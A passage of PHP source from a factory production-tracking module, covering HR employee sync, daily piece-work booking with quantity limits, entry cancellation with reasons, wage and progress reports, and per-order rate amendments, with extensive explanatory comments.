    foreach ((array)($http_response_header ?? []) as $h)
        if (preg_match('~^HTTP/\S+\s+(\d{3})~', $h, $m)) $code = (int)$m[1];

    if ($body === false)
        return ['ok' => false, 'rows' => [], 'error' => 'Could not reach the HR app. Check the address, and that this server is allowed to call it.'];
    if ($code >= 400)
        return ['ok' => false, 'rows' => [], 'error' => 'The HR app answered ' . $code
                . ($code === 401 || $code === 403 ? ' — the token was refused.' : '.')];

    $j = json_decode($body, true);
    if (!is_array($j))
        return ['ok' => false, 'rows' => [], 'error' => 'The HR app did not answer with JSON.'];

    /* A BARE ARRAY IS WHAT HIS POWER QUERY EXPECTS — Table.FromRecords on
       the document itself. Some gateways wrap it, so one level of wrapper
       is unwrapped rather than failing on a shape that means the same. */
    $list = $j;
    if (!isset($j[0])) {
        foreach (['data', 'rows', 'employees', 'result', 'records'] as $k)
            if (isset($j[$k]) && is_array($j[$k])) { $list = $j[$k]; break; }
    }
    if (!isset($list[0]) || !is_array($list[0]))
        return ['ok' => false, 'rows' => [], 'error' => 'The HR app answered, but not with a list of employees.'];

    /* ORACLE MAY SHOUT OR WHISPER ITS COLUMN NAMES. EMPNO, empno and EmpNo
       are the same column, and a sync that broke on letter case would be a
       silly way to lose a morning. */
    $pick = function (array $row, array $names) {
        foreach ($row as $k => $v)
            foreach ($names as $n)
                if (strcasecmp(trim((string)$k), $n) === 0) return trim((string)$v);
        return '';
    };

    $rows = [];
    foreach ($list as $r) {
        if (!is_array($r)) continue;
        $code2 = $pick($r, ['EMPNO', 'EMP_NO', 'EMPLOYEE_NO', 'EMP_ID', 'EMPID']);
        $name  = $pick($r, ['ENAME', 'EMP_NAME', 'EMPLOYEE_NAME', 'NAME']);
        $dept  = $pick($r, ['DEPARTMENT', 'DEPT', 'DEPT_NAME', 'DEPTNAME']);
        if ($code2 === '' || $name === '') continue;   // a person with no number is not a person we can track
        $rows[] = ['code' => strtoupper($code2), 'name' => $name, 'dept' => $dept];
    }
    if (!$rows) return ['ok' => false, 'rows' => [], 'error' => 'The HR app answered, but no employee had both a number and a name.'];

    return ['ok' => true, 'rows' => $rows, 'error' => ''];
}

/* WHAT WOULD HAPPEN — worked out and shown BEFORE anything is written.
   Returns four lists, and writes nothing. The screen prints this, he reads
   it, and only then is anything saved. A sync that acts first and reports
   afterwards is a sync nobody trusts twice. */
function zp_hr_plan(array $hrRows): array {
    zp_ensure_schema();
    $mine = [];
    foreach (zp_workers(false) as $w) $mine[strtoupper(trim((string)$w['worker_code']))] = $w;

    $plan = ['add' => [], 'change' => [], 'gone' => [], 'same' => 0];
    $seen = [];

    foreach ($hrRows as $r) {
        $code = strtoupper(trim($r['code']));
        $seen[$code] = true;
        if (!isset($mine[$code])) { $plan['add'][] = $r; continue; }

        $w = $mine[$code];
        $was  = ['name' => trim((string)$w['worker_name']), 'dept' => trim((string)($w['department'] ?? ''))];
        $now  = ['name' => trim($r['name']),                'dept' => trim($r['dept'])];
        $diff = [];
        if ($was['name'] !== $now['name']) $diff['name'] = [$was['name'], $now['name']];
        if ($was['dept'] !== $now['dept']) $diff['dept'] = [$was['dept'], $now['dept']];
        if ($diff) $plan['change'][] = ['id' => (int)$w['id'], 'code' => $code,
                                        'name' => $now['name'], 'dept' => $now['dept'],
                                        'was' => $was, 'diff' => $diff];
        else $plan['same']++;
    }

    /* GONE FROM HR — REPORTED, NEVER TOUCHED. The entry count is carried
       because "they have 40 entries against their name" is what turns this
       from a list into something he can act on. */
    foreach ($mine as $code => $w) {
        if (isset($seen[$code])) continue;
        $n = 0;
        try {
            $s = db()->prepare("SELECT COUNT(*) FROM zp_entries WHERE worker_id=? AND status='active'");
            $s->execute([(int)$w['id']]); $n = (int)$s->fetchColumn();
        } catch (Throwable $e) {}
        /* (string) IS NOT DECORATION. An array key that looks like a number
           IS a number in PHP, so an employee number of "1001" came back out
           of this loop as the integer 1001 — and then compared unequal to
           the string it went in as. Worker codes are text: W001 and 1001
           are the same kind of thing. */
        $plan['gone'][] = ['id' => (int)$w['id'], 'code' => (string)$code,
                           'name' => (string)$w['worker_name'],
                           'dept' => (string)($w['department'] ?? ''),
                           'entries' => $n, 'active' => (int)$w['is_active']];
    }
    return $plan;
}

/* Write the plan. Adds and changes only — nothing is ever removed, and no
   stage allotment is touched. One transaction, like every other import in
   this module: a half-applied sync is worse than none. */
function zp_hr_apply(array $plan): array {
    zp_ensure_schema();
    $added = 0; $changed = 0; $errors = [];

    db()->beginTransaction();
    try {
        foreach ($plan['add'] as $r) {
            $res = zp_save_worker(0, $r['code'], $r['name'], $r['dept'] !== '' ? $r['dept'] : null, 1);
            if (!$res['ok']) { $errors[] = $r['code'] . ' ' . $r['name'] . ' — ' . $res['error']; continue; }
            $added++;
        }
        foreach ($plan['change'] as $c) {
            /* is_active IS READ AND WRITTEN BACK UNCHANGED. HR does not own
               it — he does, from this screen — and a sync that quietly
               reactivated somebody he had switched off would be a fault
               nobody would think to look for. */
            $act = 1;
            try {
                $s = db()->prepare("SELECT is_active FROM zp_workers WHERE id=?");
                $s->execute([$c['id']]); $act = (int)$s->fetchColumn();
            } catch (Throwable $e) {}
            $res = zp_save_worker($c['id'], $c['code'], $c['name'],
                                  $c['dept'] !== '' ? $c['dept'] : null, $act);
            if (!$res['ok']) { $errors[] = $c['code'] . ' — ' . $res['error']; continue; }
            $changed++;
        }
        if ($errors) { db()->rollBack(); return ['ok' => false, 'added' => 0, 'changed' => 0, 'errors' => $errors]; }
        db()->commit();
    } catch (Throwable $e) {
        db()->rollBack();
        return ['ok' => false, 'added' => 0, 'changed' => 0, 'errors' => ['Nothing was saved. ' . $e->getMessage()]];
    }
    zp_meta_set('hr_last_sync', date('Y-m-d H:i:s'));
    return ['ok' => true, 'added' => $added, 'changed' => $changed, 'errors' => []];
}

/* ============================================================
   BOOKING THE DAY'S WORK
   ============================================================

   $rows = [ ['item_id','part_id','op_id','worker_id','qty'], ... ]

   NOTHING IS WRITTEN UNTIL EVERY ROW PASSES. A day sheet half-saved is worse
   than one refused: you cannot tell which half went in, and re-entering it
   double-books the half that did.
*/
function zp_book(string $date, array $rows, ?int $userId = null): array {
    zp_ensure_schema();
    $date = trim($date) !== '' ? trim($date) : date('Y-m-d');
    if (!preg_match('/^\d{4}-\d{2}-\d{2}$/', $date)) return ['ok' => false, 'errors' => ['That date is not a real date.'], 'saved' => 0];
    /* A DATE IN THE FUTURE IS ALWAYS A TYPO. Wages cannot be earned tomorrow. */
    if ($date > date('Y-m-d')) return ['ok' => false, 'errors' => ['That date is in the future. Production cannot be booked before it happens.'], 'saved' => 0];

    $lines = [];
    foreach (zp_open_lines() as $l) $lines[(int)$l['item_id']] = $l;
    $prog = zp_progress_map();

    $errors = []; $ready = []; $batch = []; $rateCache = []; $sizeRateCache = [];
    foreach ($rows as $i => $r) {
        $label  = 'Line ' . ($i + 1);
        $itemId = (int)($r['item_id'] ?? 0);
        $partId = (int)($r['part_id'] ?? 0);
        $opId   = (int)($r['op_id'] ?? 0);
        $wid    = (int)($r['worker_id'] ?? 0);
        $qty    = (float)str_replace(',', '', (string)($r['qty'] ?? 0));

        if (!$itemId && !$opId && !$wid && $qty <= 0) continue;      // an untouched blank row
        if (!$itemId)      { $errors[] = "$label: pick the order line."; continue; }
        if (!$opId)        { $errors[] = "$label: pick the operation."; continue; }
        if (!$wid)         { $errors[] = "$label: pick the worker."; continue; }
        if ($qty <= 0)     { $errors[] = "$label: quantity must be more than 0."; continue; }
        if (!isset($lines[$itemId])) { $errors[] = "$label: that order line is no longer switched on for production."; continue; }

        $line = $lines[$itemId];

        /* ============ SET WORK — a job done to the whole set ============
           Folding, bagging, boxing. It belongs to no part, so everything
           below about parts is skipped and a much simpler set of rules
           applies: the operation must be one this line really has, and the
           ceiling is the ORDER QUANTITY. Not what the parts have reached —
           folding and bagging happen as parts arrive, and making the floor
           wait for the slowest part would be wrong.

           op_kind travels with the row because zp_part_ops, zp_set_ops and
           zp_line_set_ops each number from 1, so the id alone stopped being
           unique the moment set work existed. */
        $kind = (string)($r['op_kind'] ?? 'part');
        if ($kind === 'set' || $kind === 'line') {
            $work = zp_line_set_work($itemId, (int)$line['product_id'], zp_line_size_id($line));
            $found = null;
            foreach ($work as $w) if ((int)$w['id'] === $opId && $w['kind'] === $kind) { $found = $w; break; }
            if (!$found) { $errors[] = "$label: that set job is not on this order line any more."; continue; }

            $wSt = db()->prepare("SELECT * FROM zp_workers WHERE id=? AND is_active=1");
            $wSt->execute([$wid]);
            if (!$wSt->fetch()) { $errors[] = "$label: that worker is not on the active list."; continue; }

            $key   = $itemId . ':set:' . $kind . ':' . $opId;
            $taken = $batch[$key] ?? 0.0;
            $done  = (float)($prog['set'][$itemId][$kind][$opId] ?? 0);
            $left  = (float)$line['ordered_qty'] - $done - $taken;
            if ($qty > $left + 0.0001) {
                $num = rtrim(rtrim(number_format(max(0, $left), 2), '0'), '.');
                $errors[] = "$label: only {$num} sets left for {$found['name']} on this order.";
                continue;
            }
            $batch[$key] = $taken + $qty;

            /* An order amendment re-rates by op id, and a set op id is not a
               part op id — so the amendment map is NOT consulted here. The
               rate a set job pays is the one on the line's own list, which
               is exactly where an order-specific rate is typed. */
            $rate = (float)$found['rate'];
            $sid  = (int)$found['stage_id'];
            $ready[] = [
                'entry_date' => $date, 'worker_id' => $wid,
                'proforma_id' => (int)$line['proforma_id'], 'proforma_item_id' => $itemId,
                'product_id' => (int)$line['product_id'],
                /* NO PART. The wage ledger has always allowed this; it is the
                   reason set work needed no change to that table. */
                'part_id' => null,
                'op_id' => $opId, 'op_kind' => $kind,
                'stage_id' => $sid ?: null,
                'stage' => $sid > 0 ? zp_stage_name($sid) : null,
                'qty' => $qty,
                'rate_applied' => $rate, 'amount' => round($qty * $rate, 2),
                'note' => mb_substr(trim((string)($r['note'] ?? '')), 0, 255) ?: null,
                'created_by' => $userId,
            ];
            continue;
        }

        $opSt = db()->prepare("SELECT o.*, p.part_name FROM zp_part_ops o
                               JOIN zp_parts p ON p.id = o.part_id
                               WHERE o.id=? AND o.is_active=1");
        $opSt->execute([$opId]);
        $op = $opSt->fetch();
        if (!$op) { $errors[] = "$label: that operation no longer exists, or has been switched off."; continue; }
        if ($partId <= 0) $partId = (int)$op['part_id'];
        if ($partId !== (int)$op['part_id']) { $errors[] = "$label: that operation belongs to a different part."; continue; }

        /* the part must actually be on the product this line makes */
        $onProd = false;
        foreach (zp_product_parts((int)$line['product_id']) as $pp) if ((int)$pp['id'] === $partId) { $onProd = true; break; }
        if (!$onProd) { $errors[] = "$label: \"{$op['part_name']}\" is not a part of {$line['product_name']}."; continue; }

        $wSt = db()->prepare("SELECT * FROM zp_workers WHERE id=? AND is_active=1");
        $wSt->execute([$wid]);
        if (!$wSt->fetch()) { $errors[] = "$label: that worker is not on the active list."; continue; }

        /* ROWS EARLIER IN THIS SAME SAVE COUNT AGAINST THIS ONE. Two lines for
           the same operation must add up against one allowance, or the sheet
           can book twice what exists by splitting it in half. */
        $key   = $itemId . ':' . $partId . ':' . $opId;
        $taken = $batch[$key] ?? 0.0;
        $left  = zp_remaining($line, $partId, $opId, (string)$op['stage'], $prog) - $taken;

        if ($qty > $left + 0.0001) {
            $num = rtrim(rtrim(number_format(max(0, $left), 2), '0'), '.');
            $why = zp_is_cutting($op['stage'])
                ? "that is all the order needs"
                : "only {$num} have been cut, and you cannot stitch more than was cut";
            $errors[] = "$label: only {$num} left for {$op['operation_name']} on \"{$op['part_name']}\" — {$why}.";
            continue;
        }
        $batch[$key] = $taken + $qty;

        $pfid = (int)$line['proforma_id'];
        if (!isset($rateCache[$pfid])) $rateCache[$pfid] = zp_order_rate_map($pfid);
        /* the size rates belong to the PRODUCT, not the order, so they are
           cached per product — several orders of the same product share one
           lookup instead of one each */
        $prodId = (int)$line['product_id'];
        if (!isset($sizeRateCache[$prodId])) $sizeRateCache[$prodId] = zp_op_rate_map($prodId);
        $rate = zp_rate_for($opId, (float)$op['rate'], $rateCache[$pfid],
                            $sizeRateCache[$prodId], zp_line_size_id($line));

        $ready[] = [
            'entry_date' => $date, 'worker_id' => $wid,
            'proforma_id' => $pfid, 'proforma_item_id' => $itemId,
            'product_id' => (int)$line['product_id'], 'part_id' => $partId,
            /* the id is what the wage is filed under; the name rides along so a
               report can print it without a join, and both come from the SAME
               operation row so they can never drift apart */
            'op_id' => $opId,
            'stage_id' => (int)($op['stage_id'] ?: zp_stage_id_for((string)$op['stage'])),
            'stage' => (string)$op['stage'], 'qty' => $qty,
            /* FROZEN HERE, FOR GOOD. Change the rate tomorrow and this wage
               stays exactly what was paid today. */
            'rate_applied' => $rate, 'amount' => round($qty * $rate, 2),
            'note' => mb_substr(trim((string)($r['note'] ?? '')), 0, 255) ?: null,
            'created_by' => $userId,
        ];
    }

    if ($errors) return ['ok' => false, 'errors' => $errors, 'saved' => 0];
    if (!$ready)  return ['ok' => false, 'errors' => ['Nothing to save — fill in at least one line.'], 'saved' => 0];

    db()->beginTransaction();
    try {
        $ins = db()->prepare("INSERT INTO zp_entries
            (entry_date, worker_id, proforma_id, proforma_item_id, product_id, part_id, op_id, op_kind,
             stage_id, stage, qty, rate_applied, amount, note, created_by)
            VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)");
        foreach ($ready as $e) {
            $ins->execute([$e['entry_date'], $e['worker_id'], $e['proforma_id'], $e['proforma_item_id'],
                           $e['product_id'], $e['part_id'], $e['op_id'], $e['op_kind'] ?? 'part',
                           $e['stage_id'], $e['stage'], $e['qty'],
                           $e['rate_applied'], $e['amount'], $e['note'], $e['created_by']]);
        }
        db()->commit();
    } catch (Throwable $e) {
        db()->rollBack();
        return ['ok' => false, 'errors' => ['Nothing was saved — the database refused the sheet. ' . $e->getMessage()], 'saved' => 0];
    }
    return ['ok' => true, 'errors' => [], 'saved' => count($ready),
            'amount' => round(array_sum(array_column($ready, 'amount')), 2)];
}

/* A CORRECTION IS VISIBLE, NEVER INVISIBLE. The row stays, marked cancelled,
   with who did it and why. Deleting it would make the day's total change with
   nothing to explain it. */
function zp_cancel_entry(int $id, string $reason, ?int $userId = null): array {
    zp_ensure_schema();
    $reason = trim($reason);
    if ($reason === '') return ['ok' => false, 'error' => 'Give a reason — a correction with no reason cannot be checked later.'];
    $st = db()->prepare("SELECT * FROM zp_entries WHERE id=?");
    $st->execute([$id]);
    $e = $st->fetch();
    if (!$e) return ['ok' => false, 'error' => 'That entry no longer exists.'];
    if ($e['status'] !== 'active') return ['ok' => false, 'error' => 'That entry was already cancelled.'];

    /* STITCHING STANDS ON CUTTING. Cancelling a cutting entry that stitching
       has already been booked against would leave stitched pieces that were
       never cut — a number that can never be made true again. */
    if (zp_is_cutting((string)$e['stage'])) {
        $prog = zp_progress_map();
        $it = (int)$e['proforma_item_id']; $pt = (int)$e['part_id'];
        $cut      = (float)($prog['stage'][$it][$pt]['cut'] ?? 0);
        $stitched = (float)($prog['stage'][$it][$pt]['stitched'] ?? 0);
        if ($cut - (float)$e['qty'] < $stitched - 0.0001) {
            $n = rtrim(rtrim(number_format($stitched, 2), '0'), '.');
            return ['ok' => false, 'error' => "Cannot cancel this cutting entry — {$n} pieces have already been stitched against it. Cancel the stitching first."];
        }
    }

    db()->prepare("UPDATE zp_entries SET status='cancelled', cancelled_by=?, cancelled_at=NOW(), cancel_reason=? WHERE id=?")
        ->execute([$userId, mb_substr($reason, 0, 255), $id]);
    return ['ok' => true, 'error' => ''];
}

/* The day's entries, newest first, with every name already joined on. */
function zp_entries(array $filter = [], int $limit = 300): array {
    zp_ensure_schema();
    $sql = "SELECT e.*, w.worker_name, w.worker_code, p.name product_name,
                   pt.part_name, o.operation_name, pf.pi_no
            FROM zp_entries e
            LEFT JOIN zp_workers w  ON w.id  = e.worker_id
            LEFT JOIN products  p   ON p.id  = e.product_id
            LEFT JOIN zp_parts  pt  ON pt.id = e.part_id
            LEFT JOIN zp_part_ops o ON o.id  = e.op_id
            LEFT JOIN proforma_invoices pf ON pf.id = e.proforma_id
            WHERE 1=1";
    /* LEFT JOIN, not INNER, on every one of those.
       An entry whose operation was later removed used to VANISH from the list
       while its wage still counted in the total — a report that did not add up
       and gave no clue why. */
    $p = [];
    if (!empty($filter['date']))      { $sql .= " AND e.entry_date = ?";  $p[] = $filter['date']; }
    if (!empty($filter['from']))      { $sql .= " AND e.entry_date >= ?"; $p[] = $filter['from']; }
    if (!empty($filter['to']))        { $sql .= " AND e.entry_date <= ?"; $p[] = $filter['to']; }
    if (!empty($filter['worker_id'])) { $sql .= " AND e.worker_id = ?";   $p[] = (int)$filter['worker_id']; }
    if (!empty($filter['status']))    { $sql .= " AND e.status = ?";      $p[] = $filter['status']; }
    $sql .= " ORDER BY e.entry_date DESC, e.id DESC LIMIT " . (int)$limit;
    try { $st = db()->prepare($sql); $st->execute($p); return $st->fetchAll(); } catch (Throwable $e) { return []; }
}

/* ============================================================
   REPORTING
   ============================================================

   EVERY FIGURE ON EVERY REPORT COMES FROM THE SAME LEDGER, filtered the same
   way: status='active'. That is the one decision, made once. A report that
   counted cancelled rows and a dashboard that did not would disagree about the
   wage bill, and nobody would be able to say which was right.

   All of these are ONE grouped query each. The old module asked per row and ran
   hundreds of queries to draw one table. */

function zp_range(?string $from, ?string $to): array {
    $to   = ($to   && preg_match('/^\d{4}-\d{2}-\d{2}$/', $to))   ? $to   : date('Y-m-d');
    $from = ($from && preg_match('/^\d{4}-\d{2}-\d{2}$/', $from)) ? $from : date('Y-m-d', strtotime('-29 days'));
    /* A BACKWARDS RANGE IS A TYPO, NOT A QUESTION. Swapped rather than returning
       nothing, because an empty report reads as "no production happened". */
    if ($from > $to) { $t = $from; $from = $to; $to = $t; }
    return [$from, $to];
}

/* [stage => qty], plus 'wage' and 'entries'. */
function zp_totals(string $from, string $to): array {
    zp_ensure_schema();
    $out = ['wage' => 0.0, 'entries' => 0, 'qty' => 0.0];
    foreach (zp_stages() as $s) $out[$s] = 0.0;
    try {
        $st = db()->prepare("SELECT stage, SUM(qty) q, SUM(amount) amt, COUNT(*) n
                             FROM zp_entries WHERE status='active' AND entry_date BETWEEN ? AND ?
                             GROUP BY stage");
        $st->execute([$from, $to]);
        foreach ($st->fetchAll() as $r) {
            $out[$r['stage']] = (float)$r['q'];
            $out['wage']    += (float)$r['amt'];
            $out['entries'] += (int)$r['n'];
            $out['qty']     += (float)$r['q'];
        }
    } catch (Throwable $e) {}
    return $out;
}

/* One row per DAY in the range, including days with nothing on them.
   A missing day is information — a gap in the line means the floor stopped —
   and leaving it out of the series would draw a smooth line over a shutdown. */
function zp_daily(string $from, string $to): array {
    zp_ensure_schema();
    $days = [];
    for ($d = $from; $d <= $to; $d = date('Y-m-d', strtotime($d . ' +1 day'))) {
        $days[$d] = ['date' => $d, 'qty' => 0.0, 'wage' => 0.0];
        foreach (zp_stages() as $s) $days[$d][$s] = 0.0;
        if (count($days) > 400) break;                 // a range nobody meant
    }
    try {
        $st = db()->prepare("SELECT entry_date, stage, SUM(qty) q, SUM(amount) amt
                             FROM zp_entries WHERE status='active' AND entry_date BETWEEN ? AND ?
                             GROUP BY entry_date, stage");
        $st->execute([$from, $to]);
        foreach ($st->fetchAll() as $r) {
            $d = $r['entry_date'];
            if (!isset($days[$d])) continue;
            $days[$d][$r['stage']] = (float)$r['q'];
            $days[$d]['qty']  += (float)$r['q'];
            $days[$d]['wage'] += (float)$r['amt'];
        }
    } catch (Throwable $e) {}
    return array_values($days);
}

function zp_by_worker(string $from, string $to): array {
    zp_ensure_schema();
    try {
        $st = db()->prepare("SELECT e.worker_id, w.worker_code, w.worker_name, w.department,
                                    COUNT(*) entries, SUM(e.qty) qty, SUM(e.amount) wage,
                                    COUNT(DISTINCT e.entry_date) days
                             FROM zp_entries e LEFT JOIN zp_workers w ON w.id = e.worker_id
                             WHERE e.status='active' AND e.entry_date BETWEEN ? AND ?
                             GROUP BY e.worker_id, w.worker_code, w.worker_name, w.department
                             ORDER BY wage DESC");
        $st->execute([$from, $to]);
        return $st->fetchAll();
    } catch (Throwable $e) { return []; }
}

/* DEPARTMENT-WISE WAGE COST — asked for directly: "in future I would ask daily
   wages cost by each department as we have 6 different production floors".
   The department lives on the WORKER, so this is where it comes from. A worker
   with no department is grouped as "(no department)" rather than dropped —
   dropping them would make the parts not add up to the whole. */
function zp_by_department(string $from, string $to): array {
    zp_ensure_schema();
    try {
        $st = db()->prepare("SELECT COALESCE(NULLIF(TRIM(w.department),''),'(no department)') dept,
                                    COUNT(DISTINCT e.worker_id) workers, SUM(e.qty) qty, SUM(e.amount) wage
                             FROM zp_entries e LEFT JOIN zp_workers w ON w.id = e.worker_id
                             WHERE e.status='active' AND e.entry_date BETWEEN ? AND ?
                             GROUP BY dept ORDER BY wage DESC");
        $st->execute([$from, $to]);
        return $st->fetchAll();
    } catch (Throwable $e) { return []; }
}

function zp_by_product(string $from, string $to): array {
    zp_ensure_schema();
    try {
        $st = db()->prepare("SELECT e.product_id, p.name product_name,
                                    SUM(e.qty) qty, SUM(e.amount) wage, COUNT(*) entries
                             FROM zp_entries e LEFT JOIN products p ON p.id = e.product_id
                             WHERE e.status='active' AND e.entry_date BETWEEN ? AND ?
                             GROUP BY e.product_id, p.name ORDER BY wage DESC");
        $st->execute([$from, $to]);
        return $st->fetchAll();
    } catch (Throwable $e) { return []; }
}

function zp_by_operation(string $from, string $to): array {
    zp_ensure_schema();
    try {
        /* LEFT JOIN, so an entry whose operation was later removed still shows.
           An INNER JOIN would hide the row while its wage stayed in the total —
           a report that does not add up and gives no clue why. */
        $st = db()->prepare("SELECT e.op_id, e.stage,
                                    COALESCE(pt.part_name,'(removed part)') part_name,
                                    COALESCE(o.operation_name,'(removed operation)') operation_name,
                                    SUM(e.qty) qty, SUM(e.amount) wage
                             FROM zp_entries e
                             LEFT JOIN zp_part_ops o ON o.id = e.op_id
                             LEFT JOIN zp_parts pt   ON pt.id = e.part_id
                             WHERE e.status='active' AND e.entry_date BETWEEN ? AND ?
                             GROUP BY e.op_id, e.stage, pt.part_name, o.operation_name
                             ORDER BY wage DESC");
        $st->execute([$from, $to]);
        return $st->fetchAll();
    } catch (Throwable $e) { return []; }
}

/* ORDER PROGRESS — for each live order line, how far each part has got.
   Built from the SAME zp_pieces_needed() and zp_remaining() the entry screen
   uses, so a dashboard can never claim an order is finished while the entry
   screen still offers work on it. */
function zp_order_progress(): array {
    $prog  = zp_progress_map();
    $out   = [];
    foreach (zp_open_lines() as $l) {
        $pid = (int)$l['product_id'];
        $needTot = 0.0; $cutTot = 0.0; $stitchTot = 0.0; $behind = []; $noSize = false;
        foreach (zp_product_parts($pid) as $p) {
            $partId = (int)$p['id'];
            $need   = zp_pieces_needed($l, $partId);
            /* ZP_NO_SIZE must never reach a total. Adding -1 in would quietly
               REDUCE what the order appears to need and push the percentage up,
               so a line nobody can even book would make the order look ahead of
               where it is. The line is counted as unplannable instead. */
            if ($need === ZP_NO_SIZE) { $noSize = true; continue; }
            $cut    = (float)($prog['stage'][(int)$l['item_id']][$partId]['cut'] ?? 0);
            $stitch = (float)($prog['stage'][(int)$l['item_id']][$partId]['stitched'] ?? 0);
            $needTot   += $need;
            $cutTot    += min($cut, $need);
            $stitchTot += min($stitch, $need);
            if ($need > 0 && $cut < $need) $behind[] = $p['part_name'] . ' (cutting)';
            elseif ($need > 0 && $stitch < $need) $behind[] = $p['part_name'] . ' (stitching)';
        }
        $out[] = [
            'item_id' => (int)$l['item_id'], 'pi_no' => $l['pi_no'],
            'customer' => $l['customer_name'], 'product' => $l['product_name'],
            'size' => $l['size'], 'ordered' => (float)$l['ordered_qty'],
            'needed' => $needTot, 'cut' => $cutTot, 'stitched' => $stitchTot,
            /* COMPLETION IS MEASURED ON THE LAST STAGE THAT RUNS, which is
               stitching. Measuring on cutting would call an order finished
               while nothing had been sewn. */
            /* an order carrying an unplannable line has NO honest percentage,
               so it reports 0 and says why rather than showing a number built
               from only the parts that happened to resolve */
            'pct' => ($noSize || $needTot <= 0) ? 0.0 : round($stitchTot / $needTot * 100, 1),
            'no_size' => $noSize,
            'size_problem' => $noSize ? zp_size_problem($l) : '',
            'behind' => $behind,
        ];
    }
    usort($out, fn($a, $b) => $a['pct'] <=> $b['pct']);
    return $out;
}

/* ============================================================
   PER-ORDER RATE AMENDMENTS
   ============================================================ */
function zp_order_rate_save(int $proformaId, int $opId, float $rate, string $reason, ?int $userId = null): array {
    zp_ensure_schema();
    $reason = trim($reason);
    if ($proformaId <= 0 || $opId <= 0) return ['ok' => false, 'error' => 'Pick the order and the operation.'];
    if ($rate < 0) return ['ok' => false, 'error' => 'A rate cannot be negative.'];
    /* A REASON IS NOT OPTIONAL. An amended rate that nobody can explain six
       months later is indistinguishable from a mistake. */
    if ($reason === '') return ['ok' => false, 'error' => 'Give the reason for this order paying a different rate.'];

    $opSt = db()->prepare("SELECT o.*, p.part_name FROM zp_part_ops o JOIN zp_parts p ON p.id=o.part_id WHERE o.id=?");
    $opSt->execute([$opId]);
    $op = $opSt->fetch();
    if (!$op) return ['ok' => false, 'error' => 'That operation no longer exists.'];

    $cur = db()->prepare("SELECT rate FROM zp_order_rates WHERE proforma_id=? AND op_id=?");
    $cur->execute([$proformaId, $opId]);
    $old = $cur->fetchColumn();
    $old = $old === false ? (float)$op['rate'] : (float)$old;

    db()->prepare("INSERT INTO zp_order_rates (proforma_id, op_id, rate, reason, created_by)
                   VALUES (?,?,?,?,?)
                   ON DUPLICATE KEY UPDATE rate=VALUES(rate), reason=VALUES(reason), created_by=VALUES(created_by)")
        ->execute([$proformaId, $opId, round($rate, 2), mb_substr($reason, 0, 255), $userId]);

    zp_rate_log($opId, $proformaId, $op['part_name'], $op['operation_name'], $old, round($rate, 2), $reason, $userId);
    return ['ok' => true, 'error' => ''];
}

/* Clearing an amendment puts the order back on the standard rate FROM NOW ON.
   Wages already booked keep the rate they were paid at — that is what
   rate_applied is for, and it is why this is safe to undo. */
function zp_order_rate_clear(int $proformaId, int $opId, ?int $userId = null): void {
    zp_ensure_schema();
    $opSt = db()->prepare("SELECT o.*, p.part_name FROM zp_part_ops o JOIN zp_parts p ON p.id=o.part_id WHERE o.id=?");
    $opSt->execute([$opId]);
    $op = $opSt->fetch();
    $cur = db()->prepare("SELECT rate FROM zp_order_rates WHERE proforma_id=? AND op_id=?");
    $cur->execute([$proformaId, $opId]);
    $old = $cur->fetchColumn();
    db()->prepare("DELETE FROM zp_order_rates WHERE proforma_id=? AND op_id=?")->execute([$proformaId, $opId]);
    if ($op) zp_rate_log($opId, $proformaId, $op['part_name'], $op['operation_name'],
                         $old === false ? null : (float)$old, (float)$op['rate'],
                         'Amendment removed — back to the standard rate', $userId);
}

/* Orders that can carry an amendment, EACH ONE MARKED WITH WHETHER ANYTHING IS
 * ACTUALLY IN PLAY ON IT.
 *
 * Switching an order on for production is not the same as having made
 * something for it. Most of the list is normally orders where nobody has cut a
 * single piece, and burying the two orders that are running inside forty that
 * are not is how the wrong order gets amended.
 *
 * So each row now carries:
 *   worked_ops   how many operations have real booked work on this order
 *   amend_count  how many amendments this order already carries
 *   active       either of those is greater than zero
 *
 * Nothing is removed from the list — the screen groups on this instead, because
 * the honest time to amend a rate is BEFORE the work is booked, and an order
 * that has been dropped from the list cannot be amended at all. */
function zp_rate_orders(): array {
    zp_ensure_schema(); zp_orders_schema();
    try {
        $rows = db()->query("SELECT pf.id, pf.pi_no, pf.customer_name
                             FROM proforma_invoices pf
                             WHERE pf.production_enabled = 1
                             ORDER BY pf.id DESC LIMIT 200")->fetchAll();
    } catch (Throwable $e) { return []; }
    if (!$rows) return [];

    $worked = []; $amends = [];
    try {
        foreach (db()->query("SELECT proforma_id, COUNT(DISTINCT op_id) c
                              FROM zp_entries WHERE status='active' GROUP BY proforma_id")->fetchAll() as $r)
            $worked[(int)$r['proforma_id']] = (int)$r['c'];
    } catch (Throwable $e) {}
    try {
        foreach (db()->query("SELECT proforma_id, COUNT(*) c FROM zp_order_rates GROUP BY proforma_id")->fetchAll() as $r)
            $amends[(int)$r['proforma_id']] = (int)$r['c'];
    } catch (Throwable $e) {}

    foreach ($rows as &$r) {
        $id = (int)$r['id'];
        $r['worked_ops']  = $worked[$id] ?? 0;
        $r['amend_count'] = $amends[$id] ?? 0;
        $r['active']      = ($r['worked_ops'] > 0 || $r['amend_count'] > 0);
    }
    unset($r);
    return $rows;
}

function zp_booked_on_order(int $proformaId): array {
    zp_ensure_schema();
    $out = [];
    try {
        $st = db()->prepare("SELECT op_id, SUM(qty) q, SUM(amount) amt
                             FROM zp_entries WHERE status='active' AND proforma_id=? GROUP BY op_id");
        $st->execute([$proformaId]);
        foreach ($st->fetchAll() as $r) $out[(int)$r['op_id']] = ['qty' => (float)$r['q'], 'amt' => (float)$r['amt']];
    } catch (Throwable $e) {}
    return $out;
}

/* THE OPERATIONS THAT CONCERN ONE ORDER, AND HOW CLOSELY.
 *
 * Scoping is already correct in one respect — only the parts of the products
 * THIS order's lines actually make ever appear, never the whole part library.
 * But that is still too wide to amend against: a product with nine parts and
 * four operations each puts thirty-six rows on screen for an order where two
 * operations have ever been worked. Amending the wrong one of thirty-six is
 * easy and it is silent.
 *
 * So every row now carries 'related', which is TRUE when this order has
 * actually got something riding on that operation:
 *
 *     booked_qty > 0    real work has been booked on it FOR THIS ORDER, or
 *     amended           this order already pays a different rate for it.
 *
 * The screen shows the related rows and keeps the rest one click away. It is
 * NOT a hard filter, deliberately: the correct moment to amend a rate is
 * BEFORE the work is booked, because an amendment only ever applies to work
 * booked after it. Hiding unworked operations permanently would make the most
 * useful amendment of all impossible to enter.
 *
 * STRANDED ROWS ARE PULLED BACK IN. If a part is removed from a product after
 * work was booked on it, its operation disappears from the walk above — and any
 * amendment on it would become invisible AND un-removable. The second pass
